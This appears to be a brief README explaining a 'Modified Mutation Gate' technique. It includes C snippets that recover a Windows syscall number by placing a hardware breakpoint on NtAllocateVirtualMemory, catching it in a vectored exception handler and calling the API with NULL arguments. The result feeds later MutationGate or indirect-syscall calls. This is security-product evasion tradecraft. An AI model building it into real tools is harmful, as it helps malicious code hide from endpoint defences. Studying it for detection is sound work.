# Modified Mutation Gate

1. Dynamically resolve the SSN by putting hardware breakpoint at sysenter instruction and calling the api with invalid arguments (probably NULL)
2. Use MutationGate technique


#### Set Handler

```c

LONG WINAPI recover_eax_handler(EXCEPTION_POINTERS* ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {
        if (ExceptionInfo->ContextRecord->Dr0 == ExceptionInfo->ContextRecord->Rip) {
            SSN = ExceptionInfo->ContextRecord->Rax;
            //printf("[+] Got SSN: %x\n", SSN);
            SetHWBP((LPVOID)ExceptionInfo->ContextRecord->Rip, FALSE);
        }
        ExceptionInfo->ContextRecord->EFlags |= (1 << 16);
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

```

#### Recover SSN

```c
SetHWBP((LPVOID)((DWORD64)NtAllocateVirtualMemory + 0x12), TRUE);
AddVectoredExceptionHandler(1, recover_eax_handler);
NtAllocateVirtualMemory(NULL, NULL, NULL, NULL, NULL, NULL);
```

Now any technique MutationGate/Indirect Syscall can be used after recovering SSN